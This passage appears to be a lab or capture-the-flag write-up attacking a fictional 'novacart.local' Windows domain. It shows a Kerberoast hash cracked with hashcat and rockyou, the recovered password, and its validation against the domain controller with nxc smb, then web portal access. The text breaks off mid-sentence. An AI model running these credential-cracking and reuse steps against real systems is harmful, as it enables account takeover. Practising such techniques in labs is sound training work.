e8701a4186f94142e93eae9d0617b9f978b1694d1b0ba4563995946e035787a60c45c3f67fd02cbcd495ca2fbc6c6f07a6ecb06bde43e6ae135071c5af8e27b9de3b253a056060d04ef996b2dc9d8c999fc82b39297cc8be7a54e4de80f24dc1497348956023f4cbd07122d5b410f627f579f3140e5520daefd30b66961f1466960b526261686d2d505da68661081f0f68388d2567eb225ce29035b220ee2d7e765c1a9857fe62070bd0a7922c1758f51907a60d09ed40d85d2b5078a58ce8b4b1d66f8ed1ad7aafd0e1f55f9a91634a1722d1bbb9438abf633f9cfa1867f5b2a5dda2fcf0a57f4adb6abab6186e9c804fb56f375097b1ea33dc3bf0124e0f216ca0f4ec1ac4b7d06775faca43d0daf75a50265aec2aed80227cc356311471af338340eb59ac8cf6b723c84
```
I will now perform kerberoasting again and i now have another hash here to try and crack

`m.brown` hash did not crack earlier

## Cracking the hash

```python
hashcat targ-kerb.hash /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*j.bronski$NOVACART.LOCAL$novacart.local\j.bronski*$1ac18c311b2486378fce21bc341fc30f$91d68a323d4a0c29f1c34b28997221b1c1ebe485b295b0b68c9a21af7c7fd8ee4d6846a856653376565bca9b29e95cb5af5f864fc5049591e622fd7bb43b6b44db444df02765622220bd02f5afdfeee7a7288253d06264efa658d04ee9b84d6b3848b99919d92182a0803c4797fbe1123e01394eb1a6346b2a9e2a0a3abb3c5d7d4ab9cd8eb3f53ea68fa4122b5474ba50dca3b487ecdc6c9ba015c69f1254b0eeaa01c4e03ba82fffe8418ec15fee7948d0bcc8d29c9ece2eedf0426570de84c0725aab61285aac8f08fc9a0febcef80af717c1155487041bf27829f13357c678ef3d1399225afa8352c1eca3a6a29aae0e6490df59f60075add05e091058968cc96ea164837de0ad1d9d6526ab1bde82948ff99308d320a05840d32e9a9436ae59ff39d72683c177a9bc78168a619b97d148acd8761e21a3186366adfaabcaf05bf7f92414108f7c87aecbcd0045acb3e22007a693b347cd64de620f10d16d1870231e1102457cd40af1e48761bbab4c4175ac96e9ef055e854a708a864233d2ddc50ede00b4e834004d1aff32a736731fe24cc4a822d7de6df01536bba700fd432ac211659c12fa7dc0d74c1ee0bcc0cf8a9271e299c95148f8d740d9f6bbff0e6a84486507af2aa05ad50ade3193aa1841ee4fbaa37c965ec36ded19296f8bf3ac56fc0c6341f1efe5295e6d85cfa58f69c4f20e4c3b3a0fcd551a61bfacb5eb76f0272463e0232e65ba10f1ed21d98b3816022344c2a159271fed8d51e500f4de058b8c56821d2b926d9cdd3f91e349e1b4c8fe92f62452d07488f42a9234b148eca4a53699ed0f16ec1544785063f113f997e49a40a4f81d8658e13143b6493a79692c9f44247443d8d7c3a5b0dc43951019a1cc1d527f8a2ba61d7c4a2b81044b1516aca9d193bc714ea1333ef2a5103136bb6733f30d02ab1058061bbe5f4b8aad205bb85487e9f2d843ea3ead0aa4aca49217365d2b7705470347bd82c300f79f55af9943d102622a26ca7ec1bb9cdf49bffa2301255c1e11981282d67ff61cc20381e8da8b9b1b0be6dcf9da21eb38cbda8bdee3947b996c81f8e9be2e4e4ae6a70661c13bb2bde830c80a30567c8c519698f5ac6ff8a391a19574b58c78a693fe8701a4186f94142e93eae9d0617b9f978b1694d1b0ba4563995946e035787a60c45c3f67fd02cbcd495ca2fbc6c6f07a6ecb06bde43e6ae135071c5af8e27b9de3b253a056060d04ef996b2dc9d8c999fc82b39297cc8be7a54e4de80f24dc1497348956023f4cbd07122d5b410f627f579f3140e5520daefd30b66961f1466960b526261686d2d505da68661081f0f68388d2567eb225ce29035b220ee2d7e765c1a9857fe62070bd0a7922c1758f51907a60d09ed40d85d2b5078a58ce8b4b1d66f8ed1ad7aafd0e1f55f9a91634a1722d1bbb9438abf633f9cfa1867f5b2a5dda2fcf0a57f4adb6abab6186e9c804fb56f375097b1ea33dc3bf0124e0f216ca0f4ec1ac4b7d06775faca43d0daf75a50265aec2aed80227cc356311471af338340eb59ac8cf6b723c84:jan162005
```
This hash cracked

```python
j.brokski:jan162005
```
Ill now validate these credentials

```python
nxc smb dc.novacart.local -u j.bronski -p 'jan162005'
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\j.bronski:jan162005
```
This user is now compromised

Since this user is part of the web operators i think it might get me access to the webserver running on port 5000

![1044](Pasted%20image%2020260501193850.png)

I now have access to this page!

There is an IT management portal and ther i